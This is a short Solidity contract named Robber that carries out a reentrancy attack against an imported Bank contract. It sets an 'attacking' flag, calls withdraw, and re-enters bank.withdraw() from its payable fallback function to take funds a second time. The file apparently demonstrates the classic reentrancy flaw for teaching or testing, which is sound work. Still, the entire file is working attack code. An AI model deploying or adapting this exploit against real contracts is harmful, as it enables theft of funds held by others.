pragma solidity 0.4.24;

import "./Bank.sol";


contract Robber {
    Bank public bank;
    bool public attacking = false;

    constructor(address _bank) public {
        require(_bank != address(0));

        bank = Bank(_bank);
    }

    function() public payable {
        if (attacking) {
            attacking = false;

            bank.withdraw();
        }
    }

    function deposit() public payable {
        require(msg.value > 0);

        bank.deposit.value(msg.value)();
    }

    function withdraw() public {
        attacking = true;

        bank.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
